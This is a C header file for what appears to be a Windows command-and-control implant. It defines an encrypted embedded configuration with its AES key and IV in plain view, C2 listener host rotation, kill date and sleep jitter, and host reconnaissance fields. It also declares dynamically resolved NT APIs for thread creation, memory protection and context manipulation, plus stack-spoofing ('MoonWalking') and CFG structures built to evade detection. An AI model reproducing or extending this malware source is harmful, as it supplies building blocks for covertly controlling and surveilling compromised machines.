#pragma once
#include "Common/Common.h"
#include "evasion/stackspoof/spoof.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0xb4,0x1d,0x36,0x75,0x70,0xef,0xd8,0x4c,0x38,0xa0,0x78,0x73,0x1a,0xcd,0x26,0x0c,0x4d,0x0d,0xa0,0xfc,0x7c,0xfa,0x20,0xdd,0x87,0xc9,0x55,0xd3,0x92,0x97,0x9f,0x16,0x32,0xd5,0x10,0x09,0x6e,0x48,0x6b,0x32,0x33,0xdb,0x72,0x1f,0xa0,0xd0,0x31,0x2c,0x53,0x17,0x96,0xe0,0x83,0x50,0xb0,0xc7,0x8d,0x2d,0xa5,0xd5,0xf9,0xbe,0xcc,0x07,0x63,0xe2,0xb6,0xb4,0x55,0x6f,0xe7,0x7a,0x2b,0x35,0x78,0x45,0x59,0x50,0x97,0xd5,0xcf,0x1a,0xe0,0x5e,0x66,0x1f,0x4b,0x4a,0xdd,0x43,0x6b,0xbd,0x0e,0x3c,0x9c,0x6e,0x50,0x87,0x5a,0xb3,0xe0,0xce,0x4a,0xe9,0xde,0x69,0xd3,0x3b,0x5a,0xa2,0xd0,0x18,0xc5,0x7c,0xd5,0x4d,0x5d,0xca,0x2f,0xc4,0xa2,0x3c,0x32,0x14,0xfb,0x22,0xe2,0x04,0xcd,0xfa,0xa3,0x70,0x21,0x43,0x9a,0x89,0x11,0x38,0x8c,0xf4,0x5b,0x03,0x56,0x72,0xac,0x5c,0xde,0x9e,0x77,0xc9,0xf8,0x68,0xe4,0x87,0xda,0xc3,0x51,0x08,0x5a,0x4a,0xb6,0x23,0xba,0xfc,0xab,0x57,0x9b,0xd5,0x52,0xa1,0x00,0x0a,0x82,0x16,0x0f,0x70,0x0e,0x15,0x20,0x6e,0x76,0x8c,0x13,0x8e,0xd9,0x15,0x6f,0x20,0xcf,0x60,0x1e,0xb5,0xb2,0x11,0x60,0x55,0x57,0x6f,0x44,0x1d,0xc6,0xf6,0xf5,0x2c,0x7a,0xc5,0x2c,0x9f,0xba,0xdb,0x97,0x94,0xd7,0xad,0x6c,0x14,0x6c,0x6c,0xed,0x92,0xf8,0xa4,0x10,0x60,0xc6,0xdd,0xc9,0xd8,0x50,0x79,0x77,0x09,0x0c,0x75,0x37,0xe0,0x87,0x44,0x9b,0x3b,0x91,0xaf,0xa1,0xfb,0xb5,0x92,0x8f,0xc9,0x2a,0x60,0x9a,0xb7,0x0a,0xac,0x6a,0x31,0x47,0x46,0x68,0x7d,0x43,0xe8,0x14,0xb5,0x0e,0x58,0xb3,0xe3,0x34,0x60,0x10,0xd9,0x52,0x85,0x45,0xa6,0x5f,0xf7,0x39,0x43,0xda,0x46,0xd0,0x23,0xd4,0xad,0x06,0xd9,0x64,0xd0,0xd3,0x48,0xab,0x5a,0x57,0xa3,0xc6,0x41,0x05,0x92,0xd6,0x9f,0xbe,0x53,0xc0,0x35,0x80,0x82,0x65,0x34,0xc0,0x6a,0x38,0x47,0x50,0x0a,0x59,0x34,0xce,0x52,0x9f,0xa3,0xa1,0x8d,0x26,0xfb,0x7c,0xbb,0x6a,0x19,0x5c,0x97,0xf2,0xb9,0x67,0x20,0xc8,0x8c,0xf6,0x8b,0x83,0xc2,0x24,0x9c,0x1a,0x49,0xa0,0xa6,0xe0,0x29,0x59,0xe4,0x42,0x76,0x1b,0xdc,0x89,0x69,0x09,0x3b,0x32,0xfd,0xc1,0xcb,0xae,0x2b,0x69,0xe9,0x60,0xd8,0x56,0x95,0x32,0xae,0x68,0xbb,0x18,0x2e,0x1e,0xfa,0x3c,0xad,0x64,0x21,0x44,0x88,0xed,0xe3,0xe6,0xb6,0x35,0xb3,0xcd,0xe7,0x35,0x9c,0xe1,0x8e,0x8f,0x42,0xf0,0x34,0x63,0xaa,0x59,0x93,0x74,0x9b,0xf4,0x6c,0xad,0x83,0xf9,0x8b,0xbe,0xcc,0x8f,0x4b,0xed,0x16,0x89,0x1a,0xe6,0xf2,0x4a,0x06,0xf0,0x25,0xd4,0x9e,0xaf,0xc4,0x44,0x76,0x6d,0x20,0xbe,0x46,0xee,0xe8,0x18,0x55,0x90,0xb7,0x9f,0x8b,0x73,0x33,0x91,0x1d,0xa3,0x35,0x00,0x00,0xca,0x15,0x3e,0x8d,0x8b,0x99,0xe4,0xfd,0x8a,0x84,0x34,0x89,0x36,0xf8,0xfb,0x72,0xa4,0xe3,0x20,0x9e,0xee,0x36,0x2a,0x3e,0xc3,0xca,0xd5,0xa5,0x0d,0x9b,0x88,0x05,0xb7,0x0b,0xfb,0xee,0x57,0x01,0x6a,0x9f,0x8e,0x16,0xeb,0xd7,0x77,0xc2,0xdd,0x14,0x17,0x75,0x1a,0x32,0x79,0xed,0x69,0xf1,0x1d,0x94,0x0d,0x77,0x83,0x09,0xe0,0x87,0xa9,0x5e,0x9e,0xc2,0x9c,0x69,0xdc,0x4e,0xa0,0x9e,0x8e,0x1b,0x7d,0x70,0x43,0xb8,0xbb,0xfc,0xf2,0xa8,0xd4,0x01,0x02,0x00,0xa8,0xf7,0x92,0x6b,0xc5,0x7e,0xa5,0x66,0x3d,0x4f,0x98,0xa0,0xfd,0x5c,0xa3,0xaa,0x4a,0xdf,0x19,0x32,0x41,0x9b,0x1a,0xcf,0x05,0x91,0x54,0xce,0x88,0x09,0xd0,0x7f,0xa3,0x4e,0x85,0x9f,0xce,0xe0,0xd9,0x51,0x4f,0xdc,0xa2,0xd0,0x33,0xfa,0xce,0x0f,0x62,0x98,0xa8,0xab,0x14,0x2d,0x56,0xbc,0x86,0x72,0x40,0x18,0xa0,0xbc,0x77,0xf9,0x5d,0x7e,0xc8,0x71,0x39,0x30,0xb8,0x59,0xbe,0x5d,0xdb,0x0a,0x3a,0x91,0x80,0x41,0xb5,0xe0,0x2c,0x86,0xe1,0xa3,0xbf,0x25,0xa7,0x91,0xb7,0x90,0xa3,0x8b,0x57,0xa7,0xca,0x76,0x38,0xd9,0x04,0x4c,0x68,0x6e,0x26,0xaf,0x87,0x1e,0x99,0x2d,0x30,0xc9,0xc2,0xba,0x47,0xa1,0xc1,0x82,0x8f,0x29,0xf3,0xa9,0xf0,0x9c,0x9c,0x71,0xd8,0x50,0xcd,0xb5,0xb9,0x8b,0x6e,0x6f,0x9d,0xcd,0x11,0x83,0xe8,0x38,0x13,0x02,0xa8,0xf1,0x4e,0xee,0xc6,0x8f,0xd0,0xa3,0xed,0xad,0x4e,0x26,0x5f,0x30,0x5b,0x72,0x40,0x82,0x90,0xf4,0x70,0x37,0x0b,0x71,0x4c}
 #define CONFIG_KEY_BYTES {0x3e,0xca,0x7b,0x3d,0x64,0xb9,0xd5,0x15,0x9f,0xa6,0x0f,0x88,0xa2,0x5f,0x5f,0xcc,0x68,0x69,0x38,0xba,0xb8,0x00,0x0a,0xf0,0xdb,0x7a,0xa3,0x12,0x95,0xd4,0xbc,0xbd}
 #define CONFIG_IV_BYTES {0x09,0xf0,0x16,0x4b,0x93,0xac,0x5e,0xef,0x23,0xc2,0x0a,0xc4,0x27,0xd6,0xc0,0xe6}
 #define HASH_CONFIG_BYTES {0xc6,0x7a,0x2c,0x7c,0x06,0x65,0xd8,0x66,0xf6,0x08,0xe6,0x5c,0x10,0x0e,0x60,0x90,0xa3,0xfa,0xfa,0xc6,0xcd,0x3d,0xe4,0xd2,0xec,0xbe,0xd8,0x28,0x33,0x9d,0x6a,0xde,0x7a,0xac,0xb0,0x1f,0x40,0x7f,0x8f,0x01,0xe0,0x9d,0x1f,0x2c,0x77,0x06,0xc3,0xb1,0x2c,0x9e,0x2a,0x0b,0x43,0x1e,0xaa,0x8a,0x69,0x75,0xf8,0xa3,0x31,0x32,0x3c,0x36,0xf0,0xfb,0xdb,0x8a,0x26,0x3f,0x53,0x8c,0x30,0x5c,0xa4,0x9a,0xfb,0xbd,0x32,0xcf,0x80,0xe7,0x7f,0xe1,0x02,0x5e,0x72,0x60,0xc0,0xee,0x3e,0x7c,0x79,0x73,0xf4,0x96,0x61,0xd6,0xfd,0x1f,0xdf,0xd0,0x9d,0xe0,0x8c,0x2f,0x62,0xe9,0x64,0xe6,0x0c,0x4b,0xf1,0x93,0x76,0xa6,0xdc,0xac,0xbc,0x40,0xfc,0x95,0x39,0x02,0x68,0xab,0xe1,0xe3,0x5c,0xbb,0x98,0x0b,0x84,0x88,0x1c,0xb2,0x84,0x41,0xed,0x18,0x56,0x61,0xdb,0x4d,0x18,0xd8,0x89,0x2c,0x1e,0x43,0x50,0x4c,0x46,0x1d,0x79,0x53,0x4c,0x3a,0x27,0x83,0xd3,0x57,0x0c,0x86,0x7f,0x08,0x52,0xe3,0x17,0x1d,0x59,0xaf,0x7e,0xdf,0x77,0x90,0xfa,0x4b,0xac,0x9d,0x0e,0x3d,0x84,0x97,0x9a,0x8e,0x39,0x9d,0x1c,0x20,0xf3,0x87,0xff,0x6f,0x1c,0x4c,0x02,0x74,0x13,0xec,0x88,0x24,0xd5,0xd7,0x7d,0x26,0x38,0xe9,0x01,0x95,0x27,0x6f,0xe0,0x25,0xc4,0x94,0x99,0x70,0x15,0x43,0x70,0x5e,0xd1,0xc4,0x11,0x36,0xd7,0x9d,0x33,0x22,0xa8,0x9e,0x8d,0x9a,0x55,0x29,0x73,0x60,0xf5,0xdf,0xa4,0xb0,0xde,0xfa,0xe6,0x47,0x34,0xe0,0xca,0x04,0xf4,0x4b,0xd6,0xce,0x68,0x34,0xcf,0x31,0x17,0xde,0x37,0xaa,0xfe,0x30,0xb8,0xba,0xe0,0x3b,0x55,0xf6,0x24,0xbd,0x41,0x24,0x8a,0x38,0x35,0x12,0xf1,0x79,0x58,0xff,0x6c,0xc6,0x23,0x17,0x87,0xf4,0x68,0x1a,0x5d,0xf4,0xa5,0xe4,0x42,0x1a,0x8d,0x77,0x16,0x75,0x21,0x64,0x94,0x4b,0xcf,0xd5,0x07,0xd6,0x6d,0x41,0xb1,0x5e,0xd6,0xfc,0x8e,0xb2,0x1d,0x3c,0x56,0x16,0xa7,0x0c,0x81,0xa9,0xce,0x57,0x77,0xf7,0x00,0x9c,0x01,0xda,0x15,0x7d,0x65,0x50,0x76,0xa0,0x3c,0x16,0x85,0x7d,0x67,0x27,0x7a,0x6c,0x4b,0x1d,0xf9,0xcc,0x84,0x51,0x5b,0xf8,0x2f,0x20,0x4d,0xd0,0x3e,0xd0,0x0e,0x5b,0x20,0x75,0x8d,0xf2,0xc2,0x14,0x83,0xfe,0x2c,0xe3,0x76,0x98,0x3e,0xbe,0x59,0x97,0x88,0x14,0x83,0x93,0x84,0xdb,0xb8,0x1d,0xc6,0xc9,0xe3,0x0f,0x8c,0x21,0xeb,0x0a,0x78,0x47,0x1c,0x6e,0x5d,0xa3,0xff,0xc1,0x0f,0xa9,0x85,0xce,0x5f,0x6d,0x8b,0x40,0x96,0x59,0xeb,0xde,0x54,0x10,0x23,0x1d,0x98,0xe3,0x1d,0xf1,0xa8,0xab,0x10,0xfd,0xcd,0x40,0x42,0x5f,0xdb,0x86,0x9d,0xff,0x91,0x12,0xdd,0x65,0x1c,0x13,0x23,0x6d,0x9b,0x2e,0x79,0xc5,0x2d,0x6c,0x7f,0x41,0xbd,0x23,0xe8,0xec,0x49,0x02,0x5f,0x23,0x36,0xb1,0x0d,0x34,0x01,0x19,0x23,0x66,0x3f,0xb6,0xd6,0x25,0xc0,0xf3,0x28,0x69,0x63,0x64,0xc9,0x54,0xf1,0xdd,0x53,0xc1,0x92,0x9d,0x8c,0x84,0x0f,0x57,0xc2,0x89,0x6a,0x78,0x5d,0xaf,0xae,0x3c,0x78,0x1f,0x29,0x84,0xec,0x10,0x50,0xfe,0x8d,0x37,0x0c,0x9d,0xe8,0x72,0x9a,0xa7,0x8c,0x2a,0x9e,0xba,0xd6,0xee,0x29,0x1e,0x85,0x76,0xfc,0xac,0x8c,0xd4,0xa9,0x00,0x9f,0x24,0xac,0xd8,0x62,0x62,0xee,0x40,0xbf,0x09,0x55,0x61,0xd3,0xec,0x54,0x8f,0xc7,0x55,0x6e,0x67,0x94,0x6d,0x77,0x95,0x69,0xcf,0x35,0xd5,0xea,0x28,0x23,0x47,0x1e,0x29,0x8f,0x3e}
 #define HASH_KEY_BYTES {0xf9,0xc5,0xd5,0x2d,0x08,0x03,0x14,0x29,0x70,0xf7,0xfb,0x1f,0xe6,0x1f,0x73,0xd8,0xb3,0x36,0x43,0x3b,0x98,0xa2,0x48,0xec,0xbe,0x9e,0xdc,0x72,0x1b,0xcc,0x24,0xe4}
 #define HASH_IV_BYTES {0x68,0x4f,0x7e,0xb4,0x19,0x64,0xa6,0xf9,0xaf,0xc6,0x64,0xa1,0x60,0x59,0x57,0xcc}

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;

typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;
	BOOL JmpRbx;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;
	t_LdrGetProcedureAddress pLdrGetProcedureAddress;
	t_NtQueryVirtualMemory pNtQueryVirtualMemory;
	UINT64 RtlUserThreadStartHash;
	t_NtOpenThread pNtOpenThread;
	t_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
	t_NtProtectVirtualMemory pNtProtectVirtualMemory;
	t_NtCreateThreadEx pNtCreateThreadEx;
	t_NtQueryInformationProcess pNtQueryInformationProcess;

	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;
	HMODULE hCryptSp;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

	//Kernelbase APIS
	HMODULE hKernelBase;
	UINT64 BaseThreadInitThunkHash;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

typedef struct _MoonWalking {
	PVOID RetAddr;
	PVOID FunctionPointer;
	PArgs Arguments;
} MoonWalking, * pMoonWalking;

typedef struct _PEINFO {
	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	//Number of Sections
	DWORD NumSections;
} PEINFO, * pPEINFO;

typedef struct _Agent {

	//win32 apis
	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	pPEINFO PEInfo;

	//TEB struct.
	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;

	//moonwalking structure.
	pMoonWalking Walker;

}Agent, * pAgent;

extern pAgent agent;

typedef enum  {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
} Agent_Operations;


INT init_agent(PVOID RetAddress);
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();
VOID CfgAddressAdd();
BOOL CfgQueryEnforced(VOID);